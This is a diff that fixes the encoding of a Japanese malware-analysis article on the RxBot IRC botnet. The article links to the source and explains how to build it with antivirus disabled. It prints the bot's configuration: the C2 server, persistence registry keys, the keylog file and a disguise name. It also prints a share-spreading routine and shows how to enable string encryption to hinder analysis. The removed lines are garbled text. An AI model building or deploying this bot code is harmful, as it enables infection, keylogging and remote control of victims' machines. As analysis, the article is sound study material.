@@ -1,67 +1,67 @@
 x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
 x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
 
---- �恛��: 14�΂���n�߂�RxBot��� ---
+--- 第○章: 14歳から始めるRxBot解析 ---
 
-���ҁFexbqs
+著者：exbqs
 
 x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
 x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
 
 
-��0x01.) �͂��߂�
+■0x01.) はじめに
 
-�@�U�E�R�A�Ƃ����f��������m�ł��傤���B���̒��ɓo�ꂷ��n�b�J�[�̃��b�c
-�̓{�b�g�v���O�������g���Đ��E����PC���������Ă��܂����B���E���ɑ��݂���
-PC�̂�����f�[�^�ɃA�N�Z�X�\�Ƃ����A����������ΐ��E���̉���l�̒j�B
-���W�߂��G���摜�Ƃ��W�ߕ���Ȃ킯�ł��B������ĂȂ񂾂��A���O�����ۂ���
-���傤
+　ザ・コアという映画をご存知でしょうか。その中に登場するハッカーのラッツ
+はボットプログラムを使って世界中のPCを掌握していました。世界中に存在する
+PCのあらゆるデータにアクセス可能という、言い換えれば世界中の何千人の男達
+が集めたエロ画像とか集め放題なわけです。これってなんだかアングラっぽいで
+しょう
 
-�@�}���E�F�A�̉�͂Ƃ����ƃn�b�J�[�W���p���ȂǂŃ��o�[�X�G���W�j�A�����O
-�Ƒ肵���L����������Ă��܂����ˁB�ŋ߂ł����܂ɏ�����Ă���悤�ł�����
-��͂��̂܂܌��J����Ă���\�[�X�R�[�h����͂��悤�Ƃ������b�ł��B�o�C�i
-���t�@�C������͂����Ƀ\�[�X�t�@�C������͂����炦�����Ƃ����A�����ŉ�
-������RxBot �Ƃ����{�b�g�v���O������ΏۂɁA�f��ɓo�ꂵ���悤�ȃ{�b�g�v
-���O���������ۂɂ͂ǂ̂悤�ȃR�[�h�Ƃ��Đ��藧���Ă��邩�𗝉����邱�Ƃ�
-�ړI�ł�
-
-
-��0x02.) ��͊�
-
-�@�M�҂̉�͂������͈ȉ��ɂȂ�܂����AVisual Studio�̃o�[�W�����ɂ����
-�r���h����̂Ɏ኱�̏C����������K�v�����肻���ł��B���A�r���h������ۂ�
-�̓Z�L�����e�B�\�t�g�E�F�A�𖳌��ɂ��Ȃ���΂Ȃ�܂���B���̗��p���Ă���
-AVG�ł�Backdoor.Generic_r.AK�Ƃ��Č��o����܂����E�F�����VMWARE��QEMU��
-�g�����zPC��œ��삳���邱�Ƃ������߂��܂��B������O�ł��������l�b�g��
-�[�N�ŋN�����Ďv�������Ƀ}���E�F�A��͂𖡂���Ă��������B���ꂩ�g��Ȃ�
-PC�ŁB
-
-�EWindows 7 Thinkpad T410i
-�EVisual Studio 2005
+　マルウェアの解析というとハッカージャパンなどでリバースエンジニアリング
+と題した記事が書かれていましたね。最近でもたまに書かれているようですが今
+回はそのまま公開されているソースコードを解析しようというお話です。バイナ
+リファイルを解析せずにソースファイルを解析したらええやんという、そこで懐
+かしいRxBot というボットプログラムを対象に、映画に登場したようなボットプ
+ログラムが実際にはどのようなコードとして成り立っているかを理解することが
+目的です
 
 
-��0x03.) �\�[�X�R�[�h�݂̍菈
+■0x02.) 解析環境
+
+　筆者の解析した環境は以下になりますが、Visual Studioのバージョンによって
+ビルドするのに若干の修正を加える必要がありそうです。又、ビルドをする際に
+はセキュリティソフトウェアを無効にしなければなりません。私の利用している
+AVGではBackdoor.Generic_r.AKとして検出されました・皆さんはVMWAREやQEMUを
+使い仮想PC上で動作させることをお勧めします。当たり前ですが閉じたネットワ
+ークで起動して思う存分にマルウェア解析を味わってください。それか使わない
+PCで。
+
+・Windows 7 Thinkpad T410i
+・Visual Studio 2005
+
+
+■0x03.) ソースコードの在り処
 
 http://www.filecrop.com/rxbot.html
 http://www.codeforge.cn/s/0/rxbot
 
 
-��0x04.) ��n�߂Ƀr���h�������񂾂��ǂǂ�����΂����̂�
+■0x04.) 手始めにビルドしたいんだけどどうすればいいのか
 
-�@�r���h����ۂɁA�v���W�F�N�g�̃v���p�e�B����C/C++-�x�����x�����\����
-���ĉ������B���ۂɃr���h����ƈȉ��̃G���[���\�����ꂽ�̂Ŏ�菜���Ă݂�
-�����B
+　ビルドする際に、プロジェクトのプロパティからC/C++-警告レベルを非表示に
+して下さい。実際にビルドすると以下のエラーが表示されたので取り除いてみま
+した。
 
 -----
-1>.\rndnick.cpp(52) : error C2065: 'i' : ��`����Ă��Ȃ����ʎq�ł��B
-1>.\netbios.cpp(69) : error C2065: 'i' : ��`����Ă��Ȃ����ʎq�ł��B
+1>.\rndnick.cpp(52) : error C2065: 'i' : 定義されていない識別子です。
+1>.\netbios.cpp(69) : error C2065: 'i' : 定義されていない識別子です。
 char *rndnickletter(char *strbuf)
 {	
     srand(GetTickCount());	
         int i;
 	int randlen = (rand()%3)+maxrand;
 	
-	// int i = 0; �Ƃ��Đ錾����Ă����̂ŃX�R�[�v�𔲂���strbuf[i] = '\0'�ɃG���[����
+	// int i = 0; として宣言されていたのでスコープを抜けたstrbuf[i] = '\0'にエラー発生
 	for (i=0; i < randlen; i++) 
 		strbuf[i] = (rand()%26)+97;
 	strbuf[i] = '\0';
@@ -105,7 +105,7 @@ BOOL NetConnect(char *szUsername, char *szPassword, char *szServer, EXINFO exinf
 			//addlog(buffer);
 
 			int j = 0;;
-			// int i = 0; �Ƃ��Đ錾����Ă����̂ŃX�R�[�v�𔲂���snprintf(buffer,sizeof(buffer)�ɃG���[����
+			// int i = 0; として宣言されていたのでスコープを抜けたsnprintf(buffer,sizeof(buffer)にエラー発生
 			for (i=0;i<(sizeof(sharepath) / sizeof(LPTSTR));i++) {
 				sprintf(szRemoteFile,"%s\\%s\\%s",szServer,sharepath[i],filename);
 				if ((j=CopyFile(filename,szRemoteFile,FALSE)) != 0)
@@ -147,20 +147,20 @@ BOOL NetConnect(char *szUsername, char *szPassword, char *szServer, EXINFO exinf
 }
 -----
 
-�@���{�̃T�C�g�ł̓C���X�g�[����r���h�𓮉�ŏЉ�Ă�����͑������܂�
-��B�������A�C�O�ł͊��ƌ����邱�Ƃ������ł��BVMWARE���������Ă݂Ă���
-�����B
+　日本のサイトではインストールやビルドを動画で紹介している方は多くいませ
+ん。しかし、海外では割と見つかることが多いです。VMWAREも検索してみてくだ
+さい。
 
 
-��0x05.) �\�[�X�R�[�h�̍\���ɂ���
+■0x05.) ソースコードの構成について
 
-�@�w�b�_�t�@�C����61�A�\�[�X�t�@�C����52����܂��B�A�Z���u���t�@�C��
-��1�A�o�C�i���t�@�C����1�A���Ă��������Ɣ���悤�Ɉ�̃\�[�X�t�@�C
-���ɑ΂��ăw�b�_�t�@�C������΂ƂȂ�܂��B�Ȃ̂�RxBot�����u���瑀�삷�邽
-�߂̃R�}���h���������҂����邱�Ƃ𐄑��ł��܂��B�܂� ��v�ȃR�}���h�̎�
-����rBot Command Reference�����邱�ƂŔc���ł��܂����牽�����͂���΂�
-���̂�����Ȃ��čς݂܂��B������x�̊T�v�������ł������͂ɂ͂����Ă�
-���ł��B
+　ヘッダファイルは61個、ソースファイルは52個あります。アセンブリファイル
+は1個、バイナリファイルは1個、見ていただくと判るように一つのソースファイ
+ルに対してヘッダファイルが一対となります。なのでRxBotを遠隔から操作するた
+めのコマンド分だけ両者があることを推測できます。つまり 主要なコマンドの実
+装はrBot Command Referenceを見ることで把握できますから何から解析すればよ
+いのか迷わなくて済みます。ある程度の概要も判る訳ですから解析にはもってこ
+いです。
 
 http://usuarios.multimania.es/colombomariano/HTML/rxbot%20comandos.htm
 
@@ -227,72 +227,72 @@ tcpip.h
 -----
 
 
-��0x06.) configs.h�̓��e�ɂ���
+■0x06.) configs.hの内容について
 
-�@�Ȃɂ��̃\�[�X�R�[�h����͂��鎞�Ɏ��͂܂��w�b�_�t�@�C�����璲�ׂĂ���
-���B���̃v���O�����̊T�v�������Ă��肠����x�̃v���O���~���O�o���������
-��Εϐ�����֐�������ǂ̂悤�ȏ��������Ă��邩�@����������ł��B����
-�܂��ȕ����̓\�[�X�t�@�C����ǂ�ŗ��Â����Ƃ�悤�ɂ��Ă��܂��B�Ȃ̂ŁA
-�܂���configs.h�Ƃ����ł��Ȗ��O�̃w�b�_�t�@�C����ǂ�ł����܂��傤�B�ŏ�
-����p��̃R�����g��������Ă����̂œ��{��̒��߂ɕς�����͕t��������
-���܂��B
+　なにかのソースコードを解析する時に私はまずヘッダファイルから調べていま
+す。そのプログラムの概要が判っておりある程度のプログラミング経験があるな
+らば変数名や関数名からどのような処理をしているか察しがつくからです。あい
+まいな部分はソースファイルを読んで裏づけをとるようにしています。なので、
+まずはconfigs.hという最もな名前のヘッダファイルを読んでいきましょう。最初
+から英語のコメントが書かれていたので日本語の注釈に変え幾つかは付け加えて
+います。
 
 -----
-// bot configuration (�s�C���Ȃ��̂�Lsass) 
-int port = 6667;			// �T�[�o�|�[�g
-int port2 = 6667;			// �@�@�@�@�@�@�̗\���p
-int socks4port = 38;			// Port # sock4�f�[���������s���邽�߂�  - CHANGE THIS!!!
-int tftpport = 69;			// Port # tftp�f�[���������s���邽�߂�
-int httpport = 81;			// Port # http�f�[���������s���邽�߂�
-int rloginport = 37;			// Port # rlogin�f�[���������s���邽�߂�
-BOOL topiccmd = TRUE;			// /TOPIC �R�}���h��L���ɂ���ɂ�TRUE�ɐݒ肷��
-BOOL rndfilename = TRUE;		// rxBot�̃t�@�C�����������_����[a-z]�ɐݒ肷��
-BOOL AutoStart = TRUE;			// �����N���̃��W�X�g���L�[��L���ɂ���
-char prefix = '.';			// rxBot�̃R�}���h�ړ���(�ő�ꕶ��)
-int maxrand = 6;			// �����Ō��߂�j�b�N�l�[���̌���
-int nicktype = CONSTNICK;		// NICKNAME�̎�� (rndnick.h���Q��)
-BOOL nickprefix = TRUE;			// NICKNAME�̐ړ��� (�N������o�߂������� & mIRC�풓�Ҍ���)
+// bot configuration (不気味なものはLsass) 
+int port = 6667;			// サーバポート
+int port2 = 6667;			// 　　　　　　の予備用
+int socks4port = 38;			// Port # sock4デーモンを実行するために  - CHANGE THIS!!!
+int tftpport = 69;			// Port # tftpデーモンを実行するために
+int httpport = 81;			// Port # httpデーモンを実行するために
+int rloginport = 37;			// Port # rloginデーモンを実行するために
+BOOL topiccmd = TRUE;			// /TOPIC コマンドを有効にするにはTRUEに設定する
+BOOL rndfilename = TRUE;		// rxBotのファイル名をランダムな[a-z]に設定する
+BOOL AutoStart = TRUE;			// 自動起動のレジストリキーを有効にする
+char prefix = '.';			// rxBotのコマンド接頭辞(最大一文字)
+int maxrand = 6;			// 乱数で決めるニックネームの桁数
+int nicktype = CONSTNICK;		// NICKNAMEの種類 (rndnick.hを参照)
+BOOL nickprefix = TRUE;			// NICKNAMEの接頭辞 (起動から経過した日数 & mIRC常駐者検索)
 
-#ifdef DEBUG_LOGGING			// �e�X�g�ړI�Ń��O�t�@�C���Ƀv���g�R�����_���v�ł���
+#ifdef DEBUG_LOGGING			// テスト目的でログファイルにプロトコルをダンプできる
 char logfile[]="c:\\debug.txt";
 #endif
 
-#ifndef NO_CRYPT 			// �Í������ꂽ������݂̂��g�p���邩�o�C�i�����ی삳��Ȃ���!!
+#ifndef NO_CRYPT 			// 暗号化された文字列のみを使用するかバイナリが保護されないか!!
 
-#else  					// Crypt()��ı��߂ׂ̈��ꂾ���̎g�p�����߂�(����͈��S����Ȃ�)
+#else  					// Crypt()セットアップの為これだけの使用を勧める(これは安全じゃない)
 
-char botid[] = "Tr0gBot";				// �{�b�g��
-char version[] = "[RxBot v7.6 modded by Tr0gd0r]";	// �{�[�g�o�[�W������
-char password[] = "";					// �{�b�g�l�b�g�ɐڑ�����p�X���[�h
-char server[] = ""aenigma.gotd.org"";			// �ڑ����IRC�T�[�o
-char serverpass[] = "";					// 	 �p�X���[�h���K�v�ł���ꍇ
-char channel[] = "#";					// 	 �Q������`�����l��
-char chanpass[] = "";					//	 	�p�X���[�h���K�v�ł���ꍇ
-char server2[] = "";					// �\���p	
+char botid[] = "Tr0gBot";				// ボット名
+char version[] = "[RxBot v7.6 modded by Tr0gd0r]";	// ボートバージョン名
+char password[] = "";					// ボットネットに接続するパスワード
+char server[] = ""aenigma.gotd.org"";			// 接続先のIRCサーバ
+char serverpass[] = "";					// 	 パスワードが必要である場合
+char channel[] = "#";					// 	 参加するチャンネル
+char chanpass[] = "";					//	 	パスワードが必要である場合
+char server2[] = "";					// 予備用	
 char channel2[] = "";					// 
 char chanpass2[] = "";					// 
-char filename[] = "winmgr.exe";				// �R�s�[��̃t�@�C����
-char keylogfile[] = "system.txt";			// �L�[���O�p�̃t�A�C����
-char valuename[] = "Microsoft Update Machine";		// �X�^�[�g�A�b�v�̃G���g����
-char nickconst[] = "n-";				// �{�b�g�Q�j�b�N�l�[���擪�̕���
-char szLocalPayloadFile[]="msconfig.dat";		// �y�C���[�h�𑗏o�������O��
-char modeonconn[] = "-x+B";			// /MODE ��ȏ�̃��[�h�ɂł���+/-�̗������܂܂��
+char filename[] = "winmgr.exe";				// コピー先のファイル名
+char keylogfile[] = "system.txt";			// キーログ用のフアイル名
+char valuename[] = "Microsoft Update Machine";		// スタートアップのエントリ名
+char nickconst[] = "n-";				// ボット群ニックネーム先頭の部分
+char szLocalPayloadFile[]="msconfig.dat";		// ペイロードを送出したログ名
+char modeonconn[] = "-x+B";			// /MODE 一つ以上のモードにできて+/-の両方が含まれる
 char exploitchan[] = "#n";			// REDIRECT # EXPLOIT MESSAGE  - CHANNEL
 char keylogchan[] =  "#n"; 			// REDIRECT # KEYLOG MESSAGE
 char psniffchan[] = "#n";			// REDIRECT # PSNIFF MESSAGE 
 
-char *authost[] = {				// �ڑ���`�����l���̃I�y���[�^������F��(���ڎw����o����)
+char *authost[] = {				// 接続先チャンネルのオペレータ権限を認証(直接指定も出来る)
 	"*@*",
 };
 
-char *versionlist[] = {				// ��҂łȂ��N�����o�[�W���������߂��Ƃ��ɉ���
-	"mIRC v6.03 Khaled Mardam-Bey",		// mIRC�J����:Khaled Mardam-Bey�Ƃ������O
+char *versionlist[] = {				// 作者でない誰かがバージョンを求めたときに応答
+	"mIRC v6.03 Khaled Mardam-Bey",		// mIRC開発者:Khaled Mardam-Beyという名前
 	"mIRC v6.10 Khaled Mardam-Bey",
 	"mIRC v6.12 Khaled Mardam-Bey",
 	"mIRC v6.14 Khaled Mardam-Bey"
 };
 
-// ���W�X�g���G���g���F�X�^�[�g�A�b�v���, �Z�L�����e�B���
+// レジストリエントリ：スタートアップ二種, セキュリティ二種
 char regkey1[]="Software\\Microsoft\\Windows\\CurrentVersion\\Run";
 char regkey2[]="Software\\Microsoft\\Windows\\CurrentVersion\\RunServices";
 char regkey3[]="Software\\Microsoft\\OLE";
@@ -300,27 +300,27 @@ char regkey4[]="SYSTEM\\CurrentControlSet\\Control\\Lsa";
 
 #endif
 
-#ifdef PLAIN_CRYPT		  // Encrypted Password:�Í����p�X���[�h(kerberos)
+#ifdef PLAIN_CRYPT		  // Encrypted Password:暗号化パスワード(kerberos)
 char key[16] = "2poiwsfpf3213ew"; // CHANGE THIS!!! hmmm..Do I even need this now?
 #endif
 -----
 
 
-��0x07.) maxrand = 6 ���ĂȂ�
+■0x07.) maxrand = 6 ってなんだ
 
-�@���O���琄���ł��Ȃ�����̕ϐ��̓\�[�X�t�@�C����ǂ�ŏ�����R������
-���B�܂����̕ϐ������_�u���N���b�N�ɂ��I�����Ă��ׂĂ̎Q�Ƃ̌���������
-�Ă݂܂��B����ƈȉ��̍s���V���{���̌������ʂƂ��ĕ\�������̂ł��̕ϐ�
-��rndnick.cpp�Ɏg���Ă��邠����IRC�̃j�b�N�l�[���̏������Ɨ\��������
-�ł��B
+　名前から推測できない幾つかの変数はソースファイルを読んで処理を紐解きま
+す。まずこの変数名をダブルクリックにより選択してすべての参照の検索をかけ
+てみます。すると以下の行がシンボルの検索結果として表示されるのでこの変数
+がrndnick.cppに使われているあたりIRCのニックネームの処理かと予測がつくの
+です。
 
 -----
 rndnick.cpp(25): for (int i=0;i < maxrand;i++)
 -----
 
-�@�������ʂ��_�u���N���b�N���ĎQ�Ɛ�ɑJ�ڂ���ƈȉ��̊֐�����`����Ă�
-�܂��Brandom_nickname_const() �̗���̂悤�ł������͂�j�b�N�l�[���֌W
-�ł��B
+　検索結果をダブルクリックして参照先に遷移すると以下の関数が定義されてい
+ます。random_nickname_const() の略語のようですからやはりニックネーム関係
+です。
 
 -----
 char *rndnickconst(char *strbuf)
@@ -336,11 +336,11 @@ char *rndnickconst(char *strbuf)
 }
 -----
 
-�@�������R�����g��t����̂ɏ�����R�����K�v������͖̂����Ȃ̂ŁA�ʌ�
-�v���O�����Ƃ��č��܂����B���̎��ɑ�؂ɂ��ׂ��͈Ӑ}�𖾂炩�ɂ���ϐ�
-�ȊO�S�đ��l�ɂ��Ă��܂����Ƃł��B�Ⴆ��MAXNICKLEN��28�Ƃ������l������
-���܂��B�������邱�Ƃŕϐ����ǂ̂悤�Ɏg���Ă��邩���ʂ������₷����
-��܂��B
+　正しいコメントを付けるのに処理を紐解く必要があるのは明白なので、別個の
+プログラムとして作りました。この時に大切にすべきは意図を明らかにする変数
+以外全て即値にしてしまうことです。例えばMAXNICKLENは28という即値を入れて
+います。こうすることで変数がどのように使われているか見通しがつきやすくな
+ります。
 
 -----
 #include <stdio.h>
@@ -375,31 +375,31 @@ int main() {
 }
 -----
 
-�@�ȏ�����s����ƁAn-?????? �Ƃ�������̕t�����ꂽ�����񂪕\������Ă���
-�܂��B
+　以上を実行すると、n-?????? という数列の付加された文字列が表示されていき
+ます。
 
-�@����ă����_���ȃj�b�N�l�[����t���Ă��� maxrand=6 �͕t�����鐔��̕���
-�����������Ƃ��킩��܂��BIRC�ɐڑ������ۂɂ��ꂼ��̃{�b�g�������j�b�N
-�l�[���ł��B���ɁAmaxrand=6����int nicktype = CONSTNICK;�����ĉ�����nick
-type = {REALNICK,CONSTNICK,LETTERNICK,COMPNICK,COUNTRYNICK,OSNICK} �̉���
-���Ń����_���ȉp����⊴������PC�̃��P�[���ɒu�������邱�Ƃ��ł��܂��B
+　よってランダムなニックネームを付けており maxrand=6 は付加する数列の文字
+数を示すことがわかります。IRCに接続した際にそれぞれのボットが名乗るニック
+ネームです。次に、maxrand=6直後int nicktype = CONSTNICK;を見て下さいnick
+type = {REALNICK,CONSTNICK,LETTERNICK,COMPNICK,COUNTRYNICK,OSNICK} の何れ
+かでランダムな英字列や感染したPCのロケールに置き換えることができます。
 
 
-�� 0x08.) BOOL nickprefix = TRUE ���ĂȂ�
+■ 0x08.) BOOL nickprefix = TRUE ってなんだ
 
-�@NICKNAME�ɐړ����Ƃ���[PC���N�����Čo�߂�������][mIRC�풓�҂�]�Ƃ�����
-���t���ł��܂��B100���ȍ~���풓�҂Ƃ��Đ�����[days][M] �ɂȂ�̂ŃI�y��
-�[�^���������҂�􂢏o�����߂ɉ������ݒ肾�ƍl������B����𖳌��ɂ�
-��ɂ�NO_MIRCNICK��錾����B
-�@����ƒP����100�����z�������������\���ł���܂�A��x���ċN�����Ă�
-�Ȃ�PC�̓T�[�o�ł���\�����l������̂Ŋ��������T�[�o��􂢏o�����߂�
-�ݒ肾�낤�B�����A100����{���ɑ���邩����Ȃ��B
+　NICKNAMEに接頭辞として[PCが起動して経過した日数][mIRC常駐者か]という情
+報を付加できます。100日以降を常駐者として数えて[days][M] になるのでオペレ
+ータ権限を持つ者を洗い出すために加えた設定だと考えられる。これを無効にす
+るにはNO_MIRCNICKを宣言する。
+　すると単純に100日を越える日数だけを表示できるつまり、一度も再起動してい
+ないPCはサーバである可能性が考えられるので感染したサーバを洗い出すための
+設定だろう。ただ、100日を本当に測れるか判らない。
 
-�@1��:24����:1440��:86400�b:86400000�ؕb�́AGetTickCount()[PC���N�����Čo
-�߂�������](�ؕb)���犄���ē��t���Z�o���Ă���B�������AGetTickCount()�ł�
-�߂�l��DWORD�ł���32bit:4294967295 �����A4 294 967 295 / 86 400 000 = 
-49.7102696 �Ȃ̂�49���Ń��Z�b�g������ł�����100���𑪂邱�Ƃ͂ł��܂�
-��B
+　1日:24時間:1440分:86400秒:86400000ミリ秒は、GetTickCount()[PCが起動して経
+過した時間](ミリ秒)から割って日付を算出している。しかし、GetTickCount()での
+戻り値はDWORDであり32bit:4294967295 即ち、4 294 967 295 / 86 400 000 = 
+49.7102696 なので49日でリセットされる訳ですから100日を測ることはできませ
+ん。
 
 -----
 enum {REALNICK, CONSTNICK, LETTERNICK, COMPNICK, COUNTRYNICK, OSNICK};
@@ -460,42 +460,42 @@ char *rndnick(char *strbuf, int type, BOOL prefix, char *name)
 -----
 
 
-��0x09.) NO_CRYPT���ĂȂ�
+■0x09.) NO_CRYPTってなんだ
 
-�@�E�C���X���쐬����l������Ȃ��͂�����l�������ŁA����̑΍���{
-�����Ƃ͉�͂����莞�Ԃ��������ɍς݂܂��BNO_CRYPT���錾����Ă��Ȃ���
-���Ƀ{�b�g���ێ��������̏��͈Í�������܂��B�v���W�F�N�g���r���h��
-�Ď��s�\�t�@�C�����������ꂽ�Ƃ��ɓ����ŕێ�����Ă���f�[�^�Z�O�����g
-�̈�̓������ɓW�J����Ď��s���ꂽ�i�K�Ń�������̂��̗̈�͈Í��������
-���B�t�@�C�����̂��_���v����Ȃ���Ό�����܂���iwinmgr.exe���_���v��
-��l����H�j
+　ウイルスを作成する人がいるなら解析をする人もいる訳で、幾つかの対策を施
+すことは解析するより時間をかけずに済みます。NO_CRYPTが宣言されていない場
+合にボットが保持する幾つかの情報は暗号化されます。プロジェクトをビルドし
+て実行可能ファイルが生成されたときに内部で保持されているデータセグメント
+領域はメモリに展開されて実行された段階でメモリ上のその領域は暗号化されま
+す。ファイル自体をダンプされなければ見つかりません（winmgr.exeをダンプす
+る人いる？）
 
 -----
 #ifndef NO_CRYPT
-	/* ���̗̈�͈Í�������� */
+	/* この領域は暗号化される */
 #else
-	/* ���̗̈�͈Í������ꂸ */
+	/* この領域は暗号化されず */
 #endif
 -----
 
-�@Visual Studio 2005�ł�configs.h���������A#else ~ #endif ���L���ɂȂ���
-���܂���(#ifndef NO_CRYPT ~ #else�ɒ�`���ꂽ�ϐ��Q�͊D�F�ƂȂ�)�B
-�@����āA�ǂ�����NO_CRYPT ���錾���ꂽ���Ƃ��킩��̂ł��A�������ACtrl+F
-���g�������Ώۂ����݂̃v���W�F�N�g�Ƃ��� NO_CRYPT���������Ă�#define NO_
-CRYPT�͌�����Ȃ��Ȃɂ�����͂��鎞�ɂ͍�҂̈Ӑ}��͂ޕK�v�Ɏ��X���荇
-���܂��B
-�@�����ŁA�v���W�F�N�g�̃v���p�e�B����C/C++�̃v���v���Z�b�T���J���Ɛ錾��
-��Ă��܂����B
+　Visual Studio 2005ではconfigs.hを見た時、#else ~ #endif が有効になって
+いました(#ifndef NO_CRYPT ~ #elseに定義された変数群は灰色となる)。
+　よって、どこかでNO_CRYPT が宣言されたことがわかるのです、しかし、Ctrl+F
+を使い検索対象を現在のプロジェクトとして NO_CRYPTを検索しても#define NO_
+CRYPTは見つからないなにかを解析する時には作者の意図を掴む必要に時々巡り合
+います。
+　そこで、プロジェクトのプロパティからC/C++のプリプロセッサを開くと宣言さ
+れていました。
 
 -----
 WIN32;NDEBUG;_WINDOWS;NO_AVFW_KILL;NO_SECSYSTEM;NO_REGISTRY;NO_EHANDLER;NO_CRYPT;
 -----
 
-�@�Ȃ��v���W�F�N�g�{�̂ɐ錾���Ă���̂��A���ʂɍl�����defins.h�Ő錾��
-��������ꐫ������Ǝv���̂ł�����悸�Í�����L���ɂ���ɂ�NO_CRYPT���O
-����#else ~ #endif �̕ϐ��Q�� #ifndef ~ #else �Ɉړ�������Ηǂ��ł��B��
-������� crypt.cpp - decryptstrings() �ɂ���āArBot���N���������ɈÍ���
-����܂�
+　なぜプロジェクト本体に宣言しているのか、普通に考えればdefins.hで宣言す
+る方が統一性があると思うのですが一先ず暗号化を有効にするにはNO_CRYPTを外
+して#else ~ #endif の変数群を #ifndef ~ #else に移動させれば良いです。そ
+うすれば crypt.cpp - decryptstrings() によって、rBotが起動した時に暗号化
+されます
 
 -----
 #ifndef NO_CRYPT 
@@ -538,13 +538,13 @@ void decryptstrings(int authsize, int versionsize)
 #endif
 -----
 
-�@�ʌ̃v���O���������Í��������Ƃ͂ǂ��������Ȃ̂��_�Ԍ���ɂ́APE
- Explorer���g���t�@�C���̃f�[�^�Z�O�����g��`������^�X�N�}�l�[�W������v
-���Z�X�_���v���s���ăo�C�i���G�f�B�^�ŊJ���Ď������Ă��������B
+　別個のプログラムを作り暗号化されるとはどういう事なのか垣間見るには、PE
+ Explorerを使いファイルのデータセグメントを覗いたりタスクマネージャからプ
+ロセスダンプを行ってバイナリエディタで開いて実感してください。
 
 
-��0x0A.) ������
+■0x0A.) おわりに
 
-�@���������Ȃ�܂����̂Ŏc��͎���̃��|�[�g�ɓZ�߂Ē�o���܂��B
-�@���肪�Ƃ��������܂���
+　少し長くなりましたので残りは次回のレポートに纏めて提出します。
+　ありがとうございました
 
